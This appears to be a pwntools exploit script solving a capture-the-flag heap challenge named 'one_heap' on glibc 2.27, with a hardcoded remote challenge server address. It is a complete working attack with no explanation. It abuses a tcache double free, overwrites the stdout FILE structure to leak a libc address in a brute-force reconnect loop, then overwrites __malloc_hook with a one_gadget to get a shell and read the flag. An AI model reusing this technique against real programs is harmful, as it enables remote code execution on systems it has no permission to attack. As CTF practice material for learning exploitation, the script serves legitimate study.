from pwn import *
import sys

if len(sys.argv) < 2:
    debug = True
else:
    debug = False

if debug:
    p = process("./one_heap",env = {"LD_PRELOAD":"./libc-2.27.so"})
    libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
    elf = ELF("./one_heap")
else:
    p = remote("47.104.89.129","10001")
    libc = ELF("./libc-2.27.so")
    elf = ELF("./one_heap")

def menu(choice):
    p.sendlineafter("Your choice:",str(choice))

def add(size,content):
    menu(1)
    p.sendlineafter("Input the size:",str(size))
    p.sendafter("Input the content:",content)

def free():
    menu(2)
    p.recvuntil("Done!\n")

code_base = 0x555555554000
def debugf():
    if debug:
        #gdb.attach(p,"b *{b1}".format(b1 = hex(code_base + 0xCAF)))
        gdb.attach(p,"b malloc")

def conn():
	global p,leak_addr
	while True:
		try:
			add(0x7f,"\n")
			free()
			free()
			add(0x1f,"\n")
			free()
			add(0x7f,"\n")
			add(0x7f,"\n")
			add(0x7f,"\n")
			free()
			#debugf()
			add(0x3f,"\x60\x97\n")
			payload = p64(0) * 9 + p64(0x81)
			add(0x7f,payload + "\n")
			payload = p64(0xfbad1800) + p64(0)*3 + "\x00"
			add(0x7f,payload + "\n")
			info = p.recvuntil("Done!\n")
                        if len(info) > 0x90:
                            leak_addr = u64(info[0x88:0x90])
                            break
                        else:
                            if debug:
                                p = process("./one_heap",env = {"LD_PRELOAD":"./libc-2.27.so"})
                            else:
                                p = remote("47.104.89.129","10001")
		except:
			p.close()
			if debug:
				p = process("./one_heap",env = {"LD_PRELOAD":"./libc-2.27.so"})
			else:
				p = remote("47.104.89.129","10001")
	return p

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"] 
#debugf()
leak_addr = 0
conn()
libc.address = leak_addr - libc.symbols["_IO_2_1_stdout_"] - 131
log.success("libc_base:" + hex(libc.address))
payload = p64(0) * 7 + p64(0x31) + p64(libc.symbols["__malloc_hook"] - 8)
add(0x70,payload + "\n")
add(0x20,"\n")
one_gadget = libc.address + 0x4f322
#payload = p64(one_gadget) 
payload = p64(one_gadget) + p64(libc.symbols["svc_run"] + 66)
add(0x20,payload + "\n")
menu(1)
p.sendlineafter("Input the size:",str(0))
if not debug:
    p.sendline("cat flag")
p.interactive()
